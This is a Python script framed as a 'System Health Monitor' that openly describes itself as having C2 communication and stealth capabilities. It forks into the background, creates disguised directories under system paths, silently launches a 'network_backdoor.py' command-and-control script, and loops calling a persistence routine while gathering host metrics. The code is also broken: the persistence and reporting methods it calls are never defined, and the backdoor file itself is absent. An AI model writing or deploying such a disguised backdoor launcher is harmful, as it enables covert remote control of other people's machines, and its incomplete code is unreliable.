#!/usr/bin/env python3
"""
System Health Monitor with C2 Communication
Advanced system monitoring with stealth capabilities
"""

import os
import time
import json
import psutil
import socket
import logging
import subprocess
import sys
from datetime import datetime
from pathlib import Path

class SystemHealthMonitor:
    def __init__(self):
        self.stealth_dir = "/usr/lib/systemd/system-monitor"
        self.backup_dir = "/etc/system-monitor"
        self.log_file = "/var/log/system_monitor.log"
        self.setup_logging()
        
    def setup_logging(self):
        """Setup logging configuration"""
        logging.basicConfig(
            filename=self.log_file,
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)
        
    def ensure_directories(self):
        """Ensure required directories exist"""
        Path(self.stealth_dir).mkdir(parents=True, exist_ok=True)
        Path(self.backup_dir).mkdir(parents=True, exist_ok=True)
        
        # Ensure C2 communicator is present
        c2_script = f"{self.stealth_dir}/network_backdoor.py"
        if not os.path.exists(c2_script):
            # You would copy the actual C2 script here
            self.logger.info("C2 communicator not found - would deploy here")
    
    def start_c2_communication(self):
        """Start C2 communication in background"""
        try:
            c2_script = f"{self.stealth_dir}/network_backdoor.py"
            if os.path.exists(c2_script):
                subprocess.Popen([sys.executable, c2_script],
                               stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL,
                               stdin=subprocess.DEVNULL)
                self.logger.info("C2 communication started")
        except Exception as e:
            self.logger.error(f"Failed to start C2: {e}")

    def collect_system_metrics(self):
        """Collect comprehensive system metrics"""
        try:
            # CPU metrics
            cpu_percent = psutil.cpu_percent(interval=1)
            cpu_times = psutil.cpu_times()
            load_avg = os.getloadavg()
            
            # Memory metrics
            memory = psutil.virtual_memory()
            swap = psutil.swap_memory()
            
            # Disk metrics
            disk = psutil.disk_usage('/')
            disk_io = psutil.disk_io_counters()
            
            # Network metrics
            network_io = psutil.net_io_counters()
            network_connections = psutil.net_connections()
            
            # System info
            boot_time = datetime.fromtimestamp(psutil.boot_time())
            users = psutil.users()
            
            metrics = {
                'timestamp': datetime.now().isoformat(),
                'cpu': {
                    'percent': cpu_percent,
                    'user_time': cpu_times.user,
                    'system_time': cpu_times.system,
                    'load_avg': load_avg
                },
                'memory': {
                    'total': memory.total,
                    'available': memory.available,
                    'percent': memory.percent,
                    'used': memory.used
                },
                'disk': {
                    'total': disk.total,
                    'used': disk.used,
                    'free': disk.free,
                    'percent': disk.percent
                },
                'network': {
                    'bytes_sent': network_io.bytes_sent if network_io else 0,
                    'bytes_recv': network_io.bytes_recv if network_io else 0,
                    'active_connections': len(network_connections)
                },
                'system': {
                    'boot_time': boot_time.isoformat(),
                    'active_users': len(users),
                    'hostname': socket.gethostname()
                }
            }

            return metrics
            
        except Exception as e:
            self.logger.error(f"Error collecting metrics: {e}")
            return None
    
    def monitor_loop(self):
        """Main monitoring loop with C2 integration"""
        self.logger.info("Starting system health monitoring with C2")
        
        # Start C2 communication
        self.start_c2_communication()
        
        while True:
            try:
                # Collect and report metrics
                metrics = self.collect_system_metrics()
                if metrics:
                    self.save_metrics_report(metrics, {})
                
                # Ensure persistence
                self.ensure_persistence()
                
                # Wait before next collection
                time.sleep(60)
                
            except KeyboardInterrupt:
                self.logger.info("Monitoring stopped by user")
                break
            except Exception as e:
                self.logger.error(f"Error in monitoring loop: {e}")
                time.sleep(30)

def main():
    """Main execution function"""
    # Fork to background
    if os.fork() == 0:
        monitor = SystemHealthMonitor()
        monitor.ensure_directories()
        monitor.monitor_loop()

if __name__ == "__main__":
    main()
